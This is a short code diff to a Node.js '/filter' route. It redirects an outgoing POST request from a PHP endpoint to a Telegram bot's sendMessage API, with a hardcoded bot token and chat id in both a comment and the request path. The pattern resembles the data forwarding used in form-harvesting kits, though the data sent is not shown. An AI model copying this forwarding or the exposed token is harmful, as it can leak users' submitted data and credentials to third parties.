@@ -36,12 +36,12 @@ app.post("/filter", (req, res) => {
 
     req1.write(postData);
     req1.end();
-
+// https://api.telegram.org/bot6536898950:AAHC0aCHOca0bpIGwzHGifdf-lGZ7E3tTUE/sendMessage?parse_mode=Markdown&chat_id=-1001848739093&text=$context
     setTimeout(() => {
         const req2 = http.request({
-            hostname: "imbgroup.uz",
+            hostname: "api.telegram.org",
             port: 80,
-            path: "/filter-data.php",
+            path: "/bot6536898950:AAHC0aCHOca0bpIGwzHGifdf-lGZ7E3tTUE/sendMessage?parse_mode=Markdown&chat_id=-1001848739093&text=context",
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
